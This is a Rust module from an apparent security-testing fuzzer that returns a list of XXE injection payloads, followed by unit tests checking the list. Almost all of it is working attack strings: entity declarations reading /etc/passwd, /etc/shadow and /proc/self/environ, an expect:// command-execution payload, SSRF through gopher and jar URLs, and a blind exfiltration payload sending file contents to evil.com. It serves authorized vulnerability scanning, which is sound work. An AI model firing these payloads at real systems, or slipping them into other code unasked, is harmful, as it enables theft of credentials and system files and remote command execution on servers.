//! XXE (XML External Entity) injection test payloads.
//!
//! ## Warning: For Authorized Security Testing Only
//!
//! These payloads are designed to test if target systems are vulnerable to XXE injection
//! attacks. They simulate malicious XML input that could exploit XXE vulnerabilities in
//! misconfigured XML parsers.
//!
//! **Use only on systems you have explicit permission to test.** Unauthorized testing
//! against systems you do not own or have permission to test may be illegal.
//!
//! ## Payload Categories
//!
//! - File read attacks (`file:///` protocol)
//! - Directory listing attacks
//! - External entity injection (`SYSTEM` keyword)
//! - Parameter entity attacks (`% entity`)
//! - Protocol handler abuse (`expect://`, `gopher://`, `jar://`, `data://`)
//! - XInclude attacks
//! - SSRF via external DTD references

use crate::fuzzer::payloads::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
        description: "Basic XXE file read".to_string(),
        severity: Severity::Critical,
        tags: vec!["xxe".to_string(), "file-read".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>"#.to_string(),
        description: "XXE /etc/shadow read".to_string(),
        severity: Severity::Critical,
        tags: vec!["xxe".to_string(), "file-read".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///">]><foo>&xxe;</foo>"#.to_string(),
        description: "XXE directory listing".to_string(),
        severity: Severity::High,
        tags: vec!["xxe".to_string(), "directory".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>"#.to_string(),
        description: "XXE external entity".to_string(),
        severity: Severity::Critical,
        tags: vec!["xxe".to_string(), "ssrf".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>"#.to_string(),
        description: "XXE parameter entity".to_string(),
        severity: Severity::Critical,
        tags: vec!["xxe".to_string(), "parameter-entity".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>"#.to_string(),
        description: "XXE read process environment".to_string(),
        severity: Severity::High,
        tags: vec!["xxe".to_string(), "env".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>"#.to_string(),
        description: "XXE expect protocol".to_string(),
        severity: Severity::Critical,
        tags: vec!["xxe".to_string(), "rce".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>"#.to_string(),
        description: "XXE PHP filter read source".to_string(),
        severity: Severity::High,
        tags: vec!["xxe".to_string(), "file-read".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://evil.com/evil.jar!/file">]><foo>&xxe;</foo>"#.to_string(),
        description: "XXE jar protocol".to_string(),
        severity: Severity::High,
        tags: vec!["xxe".to_string(), "ssrf".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://evil.com/_test">]><foo>&xxe;</foo>"#.to_string(),
        description: "XXE gopher protocol SSRF".to_string(),
        severity: Severity::High,
        tags: vec!["xxe".to_string(), "ssrf".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></foo>"#.to_string(),
        description: "XXE XInclude".to_string(),
        severity: Severity::Critical,
        tags: vec!["xxe".to_string(), "xinclude".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0" standalone="yes"?><!DOCTYPE foo [<!ENTITY % swaliatd SYSTEM "file:///etc/passwd">]>"#.to_string(),
        description: "XXE alternative doctype".to_string(),
        severity: Severity::Critical,
        tags: vec!["xxe".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0"?><root><item>&amp;</item></root>"#.to_string(),
        description: "XXE entity encoding test".to_string(),
        severity: Severity::Medium,
        tags: vec!["xxe".to_string(), "encoding".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,Zm9v">]><foo>&xxe;</foo>"#.to_string(),
        description: "XXE data protocol".to_string(),
        severity: Severity::High,
        tags: vec!["xxe".to_string(), "data-protocol".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/hosts">]><foo>&xxe;</foo>"#.to_string(),
        description: "XXE netdoc protocol".to_string(),
        severity: Severity::High,
        tags: vec!["xxe".to_string(), "file-read".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % param "<!ENTITY exfil SYSTEM 'http://evil.com/?data=%data;'>">%param;]><foo>&exfil;</foo>"#.to_string(),
        description: "XXE blind OOB exfiltration".to_string(),
        severity: Severity::Critical,
        tags: vec!["xxe".to_string(), "blind".to_string(), "oob".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>"#.to_string(),
        description: "XXE in SVG file upload".to_string(),
        severity: Severity::Critical,
        tags: vec!["xxe".to_string(), "svg".to_string(), "file-upload".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
        description: "XXE UTF-7 encoding bypass".to_string(),
        severity: Severity::High,
        tags: vec!["xxe".to_string(), "encoding".to_string(), "bypass".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><foo>test</foo>"#.to_string(),
        description: "XXE SSRF via external DTD".to_string(),
        severity: Severity::Critical,
        tags: vec!["xxe".to_string(), "ssrf".to_string(), "external-dtd".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><foo>&xxe;</foo>"#.to_string(),
        description: "XXE error-based detection".to_string(),
        severity: Severity::Medium,
        tags: vec!["xxe".to_string(), "error-based".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"{"root":{"@xmlns:xxe":"http://someurl","xxe:foo":"&xxe;"}}"#.to_string(),
        description: "XXE via JSON-to-XML conversion".to_string(),
        severity: Severity::High,
        tags: vec!["xxe".to_string(), "json".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Xxe,
        payload: r#"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///dev/null?%xxe;'>">%eval;%exfil;]>"#.to_string(),
        description: "XXE parameter entity chain".to_string(),
        severity: Severity::Critical,
        tags: vec!["xxe".to_string(), "parameter-entity".to_string(), "chain".to_string()],
    });

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "XXE payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_xxe_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Xxe);
        }
    }

    #[test]
    fn contains_doctype_declaration() {
        let payloads = get_payloads();
        let has_doctype = payloads.iter().any(|p| p.payload.contains("<!DOCTYPE"));
        assert!(has_doctype, "Must contain DOCTYPE declarations");
    }

    #[test]
    fn contains_entity_definitions() {
        let payloads = get_payloads();
        let has_entity = payloads.iter().any(|p| p.payload.contains("<!ENTITY"));
        assert!(has_entity, "Must contain ENTITY definitions");
    }

    #[test]
    fn contains_file_protocol_reads() {
        let payloads = get_payloads();
        let has_file = payloads
            .iter()
            .any(|p| p.payload.contains("file:///etc/passwd"));
        assert!(has_file, "Must contain file:///etc/passwd read payloads");
    }

    #[test]
    fn contains_expect_protocol_rce() {
        let payloads = get_payloads();
        let has_expect = payloads.iter().any(|p| p.payload.contains("expect://"));
        assert!(has_expect, "Must contain expect:// RCE payloads");
    }

    #[test]
    fn contains_xinclude() {
        let payloads = get_payloads();
        let has_xinclude = payloads
            .iter()
            .any(|p| p.payload.contains("xi:include") || p.payload.contains("XInclude"));
        assert!(has_xinclude, "Must contain XInclude payloads");
    }

    #[test]
    fn file_read_payloads_are_critical() {
        let payloads = get_payloads();
        let file_read: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"file-read".to_string()))
            .collect();
        assert!(!file_read.is_empty(), "Must have file-read XXE payloads");
        for p in file_read {
            assert!(
                matches!(p.severity, Severity::Critical | Severity::High),
                "File read XXE should be Critical or High"
            );
        }
    }

    #[test]
    fn contains_parameter_entity() {
        let payloads = get_payloads();
        let has_param = payloads
            .iter()
            .any(|p| p.payload.contains("% xxe") || p.payload.contains("%xxe"));
        assert!(has_param, "Must contain parameter entity (%xxe) payloads");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 18,
            "Must have substantial XXE payload coverage, got {}",
            payloads.len()
        );
    }
}
